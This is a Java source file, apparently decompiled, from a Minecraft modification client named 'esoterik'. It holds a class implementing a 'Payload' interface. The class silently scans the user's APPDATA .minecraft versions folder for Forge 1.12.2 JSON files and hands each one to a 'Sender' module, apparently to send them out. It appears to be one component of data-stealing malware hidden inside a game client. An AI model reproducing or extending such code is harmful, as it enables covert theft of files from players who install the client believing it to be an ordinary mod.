package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.Payload;
import java.io.File;
import java.util.Objects;

public final class JsonVersion implements Payload {
   public void execute() throws Exception {
      File file2 = new File(System.getenv("APPDATA") + "/.minecraft/versions");
      if (file2.isDirectory()) {
         File[] var2 = (File[])Objects.requireNonNull(file2.listFiles());
         int var3 = var2.length;

         for(int var4 = 0; var4 < var3; ++var4) {
            File file1 = var2[var4];
            if (file1.isDirectory()) {
               File[] var6 = (File[])Objects.requireNonNull(file1.listFiles());
               int var7 = var6.length;

               for(int var8 = 0; var8 < var7; ++var8) {
                  File file = var6[var8];
                  if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge")) {
                     Sender.send(file);
                  }
               }
            }
         }
      }

   }
}
